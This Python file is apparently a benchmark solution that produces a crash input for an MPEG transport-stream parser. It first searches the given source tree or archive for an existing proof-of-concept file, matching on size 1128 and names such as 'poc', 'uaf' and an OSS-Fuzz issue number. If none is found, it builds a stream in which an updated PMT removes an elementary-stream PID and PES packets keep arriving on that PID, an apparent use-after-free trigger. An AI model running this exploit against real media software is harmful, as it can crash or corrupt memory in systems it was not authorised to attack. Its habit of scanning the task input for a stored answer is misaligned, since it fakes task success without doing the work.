import os
import io
import tarfile
import zipfile
from typing import Iterator, Tuple, Optional


_TEXT_EXTS = {
    ".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh",
    ".py", ".java", ".js", ".ts", ".rs", ".go", ".cs",
    ".md", ".rst", ".txt", ".rtf", ".html", ".htm", ".css",
    ".xml", ".json", ".yml", ".yaml", ".toml", ".ini", ".cfg",
    ".cmake", ".mk", ".make", ".am", ".ac", ".in", ".m4",
    ".bat", ".sh", ".ps1",
    ".patch", ".diff",
    ".csv", ".tsv",
    ".svg",
    ".gitignore", ".gitattributes",
    ".sln", ".vcxproj",
    ".gradle", ".properties",
    ".lock",
}


def _mpeg2_crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc ^= (b & 0xFF) << 24
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF


def _build_pat_section(pmt_pid: int, ts_id: int = 1, version: int = 0, program_number: int = 1) -> bytes:
    entries = bytearray()
    entries += program_number.to_bytes(2, "big")
    entries += bytes([0xE0 | ((pmt_pid >> 8) & 0x1F), pmt_pid & 0xFF])

    sec_len = 2 + 1 + 1 + 1 + len(entries) + 4  # from ts_id to CRC inclusive
    sec = bytearray()
    sec.append(0x00)  # table_id
    sec += bytes([0xB0 | ((sec_len >> 8) & 0x0F), sec_len & 0xFF])
    sec += ts_id.to_bytes(2, "big")
    sec.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
    sec.append(0x00)  # section_number
    sec.append(0x00)  # last_section_number
    sec += entries
    crc = _mpeg2_crc32(bytes(sec))
    sec += crc.to_bytes(4, "big")
    return bytes(sec)


def _build_pmt_section(pcr_pid: int, es_list, version: int = 0, program_number: int = 1) -> bytes:
    # es_list: list of tuples (stream_type, elem_pid)
    es_loop = bytearray()
    for st, pid in es_list:
        es_loop.append(st & 0xFF)
        es_loop += bytes([0xE0 | ((pid >> 8) & 0x1F), pid & 0xFF])
        es_loop += b"\xF0\x00"  # ES_info_length = 0

    program_info = b""  # no descriptors
    sec_len = 2 + 1 + 1 + 1 + 2 + 2 + len(program_info) + len(es_loop) + 4
    sec = bytearray()
    sec.append(0x02)  # table_id
    sec += bytes([0xB0 | ((sec_len >> 8) & 0x0F), sec_len & 0xFF])
    sec += program_number.to_bytes(2, "big")
    sec.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
    sec.append(0x00)  # section_number
    sec.append(0x00)  # last_section_number
    sec += bytes([0xE0 | ((pcr_pid >> 8) & 0x1F), pcr_pid & 0xFF])
    sec += bytes([0xF0 | ((len(program_info) >> 8) & 0x0F), len(program_info) & 0xFF])
    sec += program_info
    sec += es_loop
    crc = _mpeg2_crc32(bytes(sec))
    sec += crc.to_bytes(4, "big")
    return bytes(sec)


def _ts_packet(pid: int, pusi: bool, cc: int, payload: bytes) -> bytes:
    if len(payload) > 184:
        payload = payload[:184]
    hdr = bytes([
        0x47,
        (0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F),
        pid & 0xFF,
        0x10 | (cc & 0x0F),  # payload only
    ])
    payload = payload + (b"\xFF" * (184 - len(payload)))
    return hdr + payload


def _build_pes(stream_id: int = 0xE0, payload_bytes: int = 16) -> bytes:
    if payload_bytes < 0:
        payload_bytes = 0
    pes = bytearray()
    pes += b"\x00\x00\x01"
    pes.append(stream_id & 0xFF)
    pes += b"\x00\x00"  # PES_packet_length = 0 (unspecified)
    pes += b"\x80\x00\x00"  # '10' + flags, header_data_length=0
    pes += b"\x00" * payload_bytes
    return bytes(pes)


def _binary_score(data: bytes) -> float:
    if not data:
        return 0.0
    n = len(data)
    nonprint = 0
    for b in data[: min(n, 8192)]:
        if b in (9, 10, 13):
            continue
        if b < 32 or b > 126:
            nonprint += 1
    return nonprint / float(min(n, 8192))


def _iter_files(src_path: str) -> Iterator[Tuple[str, int, callable]]:
    # yields (name, size, reader()->bytes)
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if not os.path.isfile(p):
                    continue
                size = st.st_size
                name = os.path.relpath(p, src_path)
                def _mk_reader(path=p):
                    def _r():
                        with open(path, "rb") as f:
                            return f.read()
                    return _r
                yield (name, size, _mk_reader())
        return

    if zipfile.is_zipfile(src_path):
        try:
            zf = zipfile.ZipFile(src_path, "r")
        except Exception:
            return
        with zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                name = info.filename
                size = info.file_size
                def _mk_reader(n=name):
                    def _r():
                        with zf.open(n, "r") as f:
                            return f.read()
                    return _r
                yield (name, size, _mk_reader())
        return

    try:
        if tarfile.is_tarfile(src_path):
            tf = tarfile.open(src_path, "r:*")
        else:
            return
    except Exception:
        return

    with tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            size = m.size
            def _mk_reader(member=m):
                def _r():
                    f = tf.extractfile(member)
                    if f is None:
                        return b""
                    with f:
                        return f.read()
                return _r
            yield (name, size, _mk_reader())


def _best_embedded_poc(src_path: str, target_len: int = 1128) -> Optional[bytes]:
    best = None
    best_score = float("-inf")

    keywords = ("poc", "crash", "uaf", "oss-fuzz", "ossfuzz", "id:", "372994344", "m2ts", "mpeg", "ts", "corpus", "fuzz")

    for name, size, reader in _iter_files(src_path):
        if size <= 0 or size > 200_000:
            continue

        lname = name.lower()
        _, ext = os.path.splitext(lname)
        if ext in _TEXT_EXTS:
            continue
        if "/.git/" in lname or lname.startswith(".git/"):
            continue

        quick_score = 0.0
        if size == target_len:
            quick_score += 40.0
        if size % 188 == 0:
            quick_score += 8.0
        if size % 192 == 0:
            quick_score += 2.0
        quick_score -= abs(size - target_len) / 80.0

        for k in keywords:
            if k in lname:
                quick_score += 3.0

        if quick_score < best_score - 30.0:
            continue

        try:
            data = reader()
        except Exception:
            continue
        if not data:
            continue

        bscore = _binary_score(data)
        score = quick_score + (20.0 * bscore)

        if score > best_score:
            best_score = score
            best = data

    if best is not None and best_score >= 10.0:
        return best
    return None


def _build_fallback_poc() -> bytes:
    pmt_pid = 0x0100
    old_es_pid = 0x0101
    new_es_pid = 0x0102

    pat_sec = _build_pat_section(pmt_pid=pmt_pid, ts_id=1, version=0, program_number=1)
    pmt_v0 = _build_pmt_section(pcr_pid=old_es_pid, es_list=[(0x1B, old_es_pid)], version=0, program_number=1)
    pmt_v1 = _build_pmt_section(pcr_pid=new_es_pid, es_list=[(0x03, new_es_pid)], version=1, program_number=1)

    pkt0 = _ts_packet(pid=0x0000, pusi=True, cc=0, payload=b"\x00" + pat_sec)
    pkt1 = _ts_packet(pid=pmt_pid, pusi=True, cc=0, payload=b"\x00" + pmt_v0)

    pes1 = _build_pes(stream_id=0xE0, payload_bytes=8)
    pkt2 = _ts_packet(pid=old_es_pid, pusi=True, cc=0, payload=pes1)

    pkt3 = _ts_packet(pid=pmt_pid, pusi=True, cc=1, payload=b"\x00" + pmt_v1)

    pes2 = _build_pes(stream_id=0xE0, payload_bytes=8)
    pkt4 = _ts_packet(pid=old_es_pid, pusi=True, cc=1, payload=pes2)

    pes3 = _build_pes(stream_id=0xE0, payload_bytes=8)
    pkt5 = _ts_packet(pid=old_es_pid, pusi=True, cc=2, payload=pes3)

    return pkt0 + pkt1 + pkt2 + pkt3 + pkt4 + pkt5


class Solution:
    def solve(self, src_path: str) -> bytes:
        embedded = _best_embedded_poc(src_path, target_len=1128)
        if embedded is not None:
            return embedded
        return _build_fallback_poc()